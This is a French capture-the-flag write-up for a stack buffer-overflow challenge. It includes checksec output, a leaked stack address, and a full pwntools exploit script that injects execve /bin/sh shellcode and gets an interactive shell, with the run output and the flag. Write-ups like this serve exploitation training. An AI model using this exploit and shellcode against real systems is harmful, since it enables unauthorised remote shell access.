# SHELLCODE
```
ncat 35.238.225.156 1006
```
- Fichier : [shellcode](../attachements/shellcode/shellcode)
Ici il faut faire une injection de shell, le stack est exécutable
```js
$ checksec shellcode
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```
```py
gdb> vmmap
0x00007ffffffde000 0x00007ffffffff000 rwxp    [stack]
```
Et le programme est gentil il nous file même l'adresse du stack :)
```
$ ncat 35.238.225.156 1006
Amigo's I welcome you to the boot2root server
Wait did I say something I wasnt supposed to[0x7fffffffe250] ?
Okay Waiting for the answer now
```
```as
lea rdi, str.Wait_did_I_say_something_I_wasnt_supposed_to__p ; 0x2038 ; "Wait did I say something I wasnt supposed to[%p] ?\n"
mov eax, 0
call sym.imp.printf
```
Alors on fait un programme qui se connecte au serveur, récupère l'adresse du stack, puis send une payload de ce type :
```
overflow + ret + shell
```
**exploit.py** :
```py
import re
import struct
from pwn import *

conn = remote('35.238.225.156', 1006)

received = conn.recvuntil('now\n')
print(received.decode())

reg = re.search('.*\[(.*)\].*',received.decode())
assert reg, log.error('Stack address not found !')

stack_addr = reg.group(1).encode()
stack_addr = int(stack_addr,16) 
log.info('Stack addresss is at {}'.format(hex(stack_addr)))


overflow = b'A'*24
ret = struct.pack('Q',stack_addr+len(overflow)+8)
shell = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

payload = overflow + ret + shell

log.info('Sending payload...')
conn.send(payload + b'\n')

log.success('Executing /bin/sh : ')
conn.interactive()
```
- Fichier : [exploit.py](../attachements/shellcode/exploit.py)
On l'exécute et on a un shell :)
```
$ python exploit.py
[+] Opening connection to 127.0.0.1 on port 13371: Done
Amigo's I welcome you to the boot2root server
Wait did I say something I wasnt supposed to[0x7fffffffe1d0] ?
Okay Waiting for the answer now

[*] Stack addresss is at 0x7fffffffe1d0
[*] Sending payload...
[+] Executing /bin/sh : 
[*] Switching to interactive mode
$ cat flag
b00t2root{sehllz_c0de}
```
flag : `b00t2root{sehllz_c0de}`
GG ! Enfin un qui ne fait pas partie de ceux qui ne sont rien
<:macron:784920050544017429>
